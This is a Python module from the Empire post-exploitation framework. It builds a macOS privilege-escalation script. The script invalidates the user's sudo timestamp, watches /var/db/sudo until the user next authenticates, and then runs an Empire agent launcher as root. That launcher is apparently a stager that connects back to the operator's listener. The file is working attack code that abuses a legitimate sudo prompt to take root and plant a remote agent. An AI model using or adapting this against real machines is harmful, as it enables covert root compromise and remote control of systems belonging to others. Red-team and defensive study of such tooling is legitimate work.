from __future__ import print_function

from builtins import str
from builtins import object
from typing import Dict

from empire.server.common import helpers
from empire.server.common.module_models import PydanticModule


class Module(object):
    @staticmethod
    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):

        # extract all of our options
        listener_name = params['Listener']
        user_agent = params['UserAgent']
        safe_checks = params['SafeChecks']

        # generate the launcher code
        launcher = main_menu.stagers.generate_launcher(listener_name, language='python', userAgent=user_agent, safeChecks=safe_checks)

        if launcher == "":
            print(helpers.color("[!] Error in launcher command generation."))
            return ""
        else:
            launcher = launcher.replace("'", "\\'")
            launcher = launcher.replace('echo', '')
            parts = launcher.split("|")
            launcher = "sudo python -c %s" % (parts[0])
            script = """
import os
import time
import subprocess
sudoDir = "/var/db/sudo"
subprocess.call(['sudo -K'], shell=True)
oldTime = time.ctime(os.path.getmtime(sudoDir))
exitLoop=False
while exitLoop is False:
    newTime = time.ctime(os.path.getmtime(sudoDir))
    if oldTime != newTime:
        try:
            subprocess.call(['%s'], shell=True)
            exitLoop = True
        except:
            pass
            """ % (launcher)

            return script
